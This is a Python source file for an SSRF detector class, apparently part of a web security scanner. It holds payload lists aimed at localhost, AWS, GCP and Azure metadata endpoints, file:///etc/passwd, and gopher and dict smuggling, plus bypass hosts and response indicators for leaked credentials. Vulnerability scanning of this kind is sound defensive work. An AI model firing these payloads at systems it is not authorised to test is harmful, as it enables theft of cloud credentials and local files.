"""SSRF (Server-Side Request Forgery) Detector
Detects SSRF vulnerabilities with cloud metadata, protocol smuggling, and blind detection
"""

import re
import logging

logger = logging.getLogger(__name__)


class SSRFDetector:
    """Detect Server-Side Request Forgery vulnerabilities
    
    Tests for:
    1. Internal network access (localhost, private IPs)
    2. Cloud metadata endpoints (AWS, GCP, Azure, OpenStack)
    3. Protocol smuggling (file://, gopher://, dict://, etc.)
    4. DNS rebinding bypasses
    5. URL parser confusion
    """
    
    # Localhost variations
    LOCALHOST_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",  # IPv6 localhost
        "http://2130706433",  # Decimal IP (127.0.0.1)
        "http://0x7f000001",  # Hex IP (127.0.0.1)
        "http://0177.0.0.1",  # Octal IP
        "http://127.1",  # Short form
    ]
    
    # AWS metadata endpoints
    AWS_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/",
        "http://instance-data",  # AWS instance metadata hostname
    ]
    
    # GCP metadata endpoints
    GCP_PAYLOADS = [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/",
        "http://metadata/computeMetadata/v1/",
    ]
    
    # Azure metadata endpoints
    AZURE_PAYLOADS = [
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/metadata/",
    ]
    
    # Other cloud providers
    OTHER_CLOUD_PAYLOADS = [
        "http://169.254.169.254/openstack",  # OpenStack
        "http://169.254.169.254/2009-04-04/meta-data/",  # DigitalOcean
    ]
    
    # Protocol smuggling (advanced)
    PROTOCOL_PAYLOADS = [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:25/",  # SMTP
        "dict://127.0.0.1:11211/",  # Memcached
        "ldap://127.0.0.1",
        "ftp://127.0.0.1",
    ]
    
    # DNS rebinding / bypass techniques
    BYPASS_PAYLOADS = [
        "http://127.0.0.1.nip.io",  # DNS service that resolves to IP
        "http://spoofed.burpcollaborator.net",
        "http://localhost.127.0.0.1.nip.io",
    ]
    
    # Quick mode payloads (most reliable)
    QUICK_PAYLOADS = [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
    ]
    
    # SSRF indicators (AWS)
    AWS_INDICATORS = [
        r'ami-id',
        r'ami-launch-index',
        r'ami-manifest-path',
        r'block-device-mapping',
        r'instance-id',
        r'instance-type',
        r'local-hostname',
        r'local-ipv4',
        r'placement',
        r'public-hostname',
        r'public-ipv4',
        r'security-groups',
        r'iam/security-credentials',
        r'AWSAccessKeyId',
        r'SecretAccessKey',
        r'Token',
    ]
    
    # SSRF indicators (GCP)
    GCP_INDICATORS = [
        r'computeMetadata',
        r'attributes',
        r'service-accounts',
        r'access_token',
        r'project-id',
        r'instance/name',
        r'instance/zone',
    ]
    
    # SSRF indicators (Azure)  
    AZURE_INDICATORS = [
        r'"compute"',
        r'"network"',
        r'subscriptionId',
        r'resourceGroupName',
        r'vmId',
        r'privateIpAddress',
    ]
    
    # Generic SSRF indicators
    GENERIC_INDICATORS = [
        r'root:x:0:0:',  # /etc/passwd
        r'\[extensions\]',  # win.ini
        r'connection refused',
        r'connection timeout',
        r'connection timed out',
        r'could not connect',
        r'unable to connect',
        r'unreachable',
        r'no route to host',
        r'network is unreachable',
        r'ssh-',  # SSH banner
        r'220.*smtp',  # SMTP banner
        r'curl:',
        r'wget:',
    ]
    
    # Common parameter names
    COMMON_PARAMS = [
        'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'return',
        'next', 'callback', 'link', 'site', 'domain', 'host', 'target',
        'feed', 'rss', 'pdf', 'doc', 'file', 'image', 'img', 'src'
    ]
    
    def __init__(self, client, quick_mode=False):
        """Initialize SSRF detector
        
        Args:
            client: HTTP client for making requests
            quick_mode: If True, use fewer payloads for speed
        """
        self.client = client
        self.quick_mode = quick_mode
        logger.info(f"SSRF Detector initialized (quick_mode={quick_mode})")
    
    def test(self, path, param=None):
        """Test endpoint for SSRF vulnerabilities
        
        Args:
            path: URL path to test
            param: Parameter name to test (optional, tests common params if None)
            
        Returns:
            Dictionary with finding details if vulnerability found, None otherwise
        """
        params_to_test = [param] if param else self.COMMON_PARAMS
        
        # Reduce params in quick mode
        if self.quick_mode and not param:
            params_to_test = self.COMMON_PARAMS[:5]
        
        for test_param in params_to_test:
            # Test localhost access
            result = self._test_localhost(path, test_param)
            if result:
                return result
            
            # Test cloud metadata
            result = self._test_cloud_metadata(path, test_param)
            if result:
                return result
            
            # Test protocol smuggling (skip in quick mode)
            if not self.quick_mode:
                result = self._test_protocol_smuggling(path, test_param)
                if result:
                    return result
        
        return None
    
    def _test_localhost(self, path, param):
        """Test localhost access"""
        payloads = [self.QUICK_PAYLOADS[0]] if self.quick_mode else self.LOCALHOST_PAYLOADS
        
        for payload in payloads:
            try:
                res = self.client.get(path, params={param: payload})
                if not res or not res.text:
                    continue
                
                text_lower = res.text.lower()
                
                # Check for generic SSRF indicators
                for indicator in self.GENERIC_INDICATORS:
                    if re.search(indicator, text_lower, re.IGNORECASE):
                        return {
                            "type": "ssrf",
                            "subtype": "localhost_access",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Localhost SSRF detected: {indicator}",
                            "confidence": 0.85,
                            "severity": "high",
                            "description": "SSRF allows access to localhost services"
                        }
            
            except Exception as e:
                logger.debug(f"Localhost SSRF test error: {e}")
                continue
        
        return None
    
    def _test_cloud_metadata(self, path, param):
        """Test cloud metadata access"""
        if self.quick_mode:
            test_payloads = [self.QUICK_PAYLOADS[1], self.QUICK_PAYLOADS[2]]
        else:
            test_payloads = self.AWS_PAYLOADS + self.GCP_PAYLOADS + self.AZURE_PAYLOADS + self.OTHER_CLOUD_PAYLOADS
        
        for payload in test_payloads:
            try:
                res = self.client.get(path, params={param: payload})
                if not res or not res.text:
                    continue
                
                response_text = res.text
                text_lower = response_text.lower()
                
                # Determine cloud provider
                cloud_provider = "Unknown"
                indicators = self.GENERIC_INDICATORS
                
                if '169.254.169.254' in payload or 'instance-data' in payload:
                    if '/latest/' in payload:
                        cloud_provider = "AWS"
                        indicators = self.AWS_INDICATORS
                    elif '/metadata/instance' in payload:
                        cloud_provider = "Azure"
                        indicators = self.AZURE_INDICATORS
                elif 'metadata.google' in payload:
                    cloud_provider = "GCP"
                    indicators = self.GCP_INDICATORS
                
                # Check for cloud-specific indicators
                for indicator in indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        return {
                            "type": "ssrf",
                            "subtype": "cloud_metadata_access",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"{cloud_provider} metadata leaked: {indicator}",
                            "cloud_provider": cloud_provider,
                            "confidence": 0.95,
                            "severity": "critical",
                            "description": f"SSRF allows access to {cloud_provider} metadata - credentials may be exposed"
                        }
                
                # Check for generic indicators
                for indicator in self.GENERIC_INDICATORS:
                    if re.search(indicator, text_lower, re.IGNORECASE):
                        return {
                            "type": "ssrf",
                            "subtype": "cloud_metadata_access",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Cloud metadata SSRF: {indicator}",
                            "cloud_provider": cloud_provider,
                            "confidence": 0.8,
                            "severity": "critical"
                        }
            
            except Exception as e:
                logger.debug(f"Cloud metadata test error: {e}")
                continue
        
        return None
    
    def _test_protocol_smuggling(self, path, param):
        """Test protocol smuggling"""
        for payload in self.PROTOCOL_PAYLOADS:
            try:
                res = self.client.get(path, params={param: payload})
                if not res or not res.text:
                    continue
                
                response_text = res.text
                text_lower = response_text.lower()
                
                # Check for file disclosure
                if payload.startswith('file://'):
                    for indicator in self.GENERIC_INDICATORS[:2]:  # File content indicators
                        if re.search(indicator, response_text, re.IGNORECASE):
                            return {
                                "type": "ssrf",
                                "subtype": "file_protocol_smuggling",
                                "endpoint": path,
                                "param": param,
                                "payload": payload,
                                "evidence": f"File protocol SSRF: {indicator}",
                                "confidence": 0.95,
                                "severity": "critical",
                                "description": "SSRF with file:// protocol allows reading local files"
                            }
                
                # Check for protocol-specific indicators
                protocol_indicators = {
                    'gopher://': ['250 ', '354 '],  # SMTP responses
                    'dict://': ['DICT'],
                    'ldap://': ['LDAP'],
                    'ftp://': ['220', 'FTP'],
                }
                
                for proto, indicators in protocol_indicators.items():
                    if payload.startswith(proto):
                        for indicator in indicators:
                            if indicator.lower() in text_lower:
                                return {
                                    "type": "ssrf",
                                    "subtype": "protocol_smuggling",
                                    "endpoint": path,
                                    "param": param,
                                    "payload": payload,
                                    "evidence": f"Protocol smuggling detected: {indicator}",
                                    "protocol": proto.rstrip('://'),
                                    "confidence": 0.85,
                                    "severity": "high",
                                    "description": f"SSRF with {proto} protocol allows service interaction"
                                }
            
            except Exception as e:
                logger.debug(f"Protocol smuggling test error: {e}")
                continue
        
        return None
